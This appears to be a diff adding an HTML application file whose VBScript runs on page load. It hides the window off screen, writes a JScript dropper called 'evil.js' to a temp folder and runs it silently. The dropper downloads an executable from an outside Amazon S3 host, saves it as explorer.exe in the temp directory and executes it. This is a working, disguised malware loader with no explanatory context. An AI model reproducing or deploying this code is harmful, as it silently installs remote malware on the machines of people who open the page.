@@ -1,0 +1,33 @@
+<HTML> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD> 
+<script language="VBScript">
+	Window.ReSizeTo 0, 0
+	Window.moveTo -2000,-2000 
+	Function var_func()
+		var_shellcode = "var WSHShell = new ActiveXObject(""WScript.Shell"");path = WSHShell.ExpandEnvironmentStrings(""%temp%"");var filepath = path+""/explorer.exe"";var xhr = new ActiveXObject(""MSXML2.XMLHTTP"");xhr.open(""GET"",""http://winapt.s3-accelerate.amazonaws.com/csx86.exe"", false);xhr.send();if (xhr.Status == 200){var fso = new ActiveXObject(""Scripting.FileSystemObject"");var stream = new ActiveXObject(""ADODB.Stream"");stream.Open();stream.Type = 1;stream.Write(xhr.ResponseBody);stream.Position = 0;if (fso.FileExists(filepath)){fso.DeleteFile(filepath);}stream.SaveToFile(filepath);stream.Close();new ActiveXObject(""WScript.Shell"").Exec(filepath);}"
+		Dim var_obj
+		Set var_obj = CreateObject("Scripting.FileSystemObject")
+		Dim var_stream
+		Dim var_tempdir
+		Dim var_tempexe
+		Dim var_basedir
+		Set var_tempdir = var_obj.GetSpecialFolder(2)
+		var_basedir = var_tempdir & "\" & var_obj.GetTempName()
+		var_obj.CreateFolder(var_basedir)
+		var_tempexe = var_basedir & "\" & "evil.js"
+		Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
+		var_stream.Write var_shellcode
+		var_stream.Close
+		Dim var_shell
+		Set var_shell = CreateObject("Wscript.Shell")
+		regstr = "cscript "& var_tempexe
+		var_shell.run regstr, 0, true
+	End Function
+
+	var_func
+</script>
+<body>
+</body>
+</HEAD> 
+</HTML>
